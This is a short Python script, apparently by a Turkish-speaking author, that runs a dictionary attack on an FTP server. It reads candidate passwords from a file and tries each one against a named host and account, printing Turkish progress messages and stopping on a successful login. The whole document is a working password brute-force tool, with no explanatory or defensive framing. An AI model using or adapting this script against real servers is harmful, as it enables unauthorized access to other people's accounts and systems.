import urllib, sys
import ftplib
from ftplib import FTP

urllib.FancyURLopener.version = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.103 Safari/537.36'

_link = 'ftp.barankaraboga.com'
_user = 'testuser@barankaraboga.com'

ftp = FTP(_link)

f = open('passwordlist.txt','r')
xmas = f.readlines()

for i in xmas:
    i = i.strip()
    try:
        print('şifre deneniyor : ', str(i))
        ftp.login(user=_user,passwd=i)
        print('deneme başarılı')
        ftp.quit()
        sys.exit()
    except ftplib.error_perm as e:
        print('giriş başarısız!')

print('[-] DENENEN ŞİFRE SAYISI ' + str(len(xmas)) + ', EŞLEŞME YOK.')
